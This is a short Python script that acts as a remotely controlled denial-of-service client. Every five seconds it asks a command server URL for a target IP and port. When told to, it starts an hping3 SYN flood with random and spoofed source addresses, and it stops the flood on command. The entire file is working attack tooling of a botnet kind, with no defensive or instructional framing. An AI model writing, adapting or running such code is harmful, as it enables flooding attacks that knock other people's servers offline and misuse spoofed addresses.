import subprocess
import requests
import schedule
import time

SERVER_URL = "https://test.planckstudio.in/dos/task.php"
HPING3_PROCESS = None

def start_hping3(ip, port):
    global HPING3_PROCESS
    if HPING3_PROCESS is None or HPING3_PROCESS.poll() is not None:
        command = f"sudo hping3 --flood -c 15000 -S -w --rand-source -d 1024 -a 8.8.8.8 -p {port} {ip} > /dev/null 2>&1"
        HPING3_PROCESS = subprocess.Popen(command, shell=True)

def stop_hping3():
    global HPING3_PROCESS
    if HPING3_PROCESS is not None and HPING3_PROCESS.poll() is None:
        # HPING3_PROCESS.kill()
        kill_hping3()

def kill_hping3():
    try:
        subprocess.run(['sudo', 'pkill', 'hping3'])
        print("hping3 process killed successfully")
    except Exception as e:
        print(f"Error while killing hping3 process: {e}")

def check_json_file():
    try:
        response = requests.get(SERVER_URL)
        data = response.json()
        status = data.get("status")
        ip = data.get("ip")
        port = data.get("port")
        if status:
            start_hping3(ip, port)
        else:
            stop_hping3()
    except Exception as e:
        print(f"Error: {e}")

# Schedule cron job to run every 5 seconds
schedule.every(5).seconds.do(check_json_file)

# Run the cron job indefinitely
while True:
    schedule.run_pending()
    time.sleep(1)
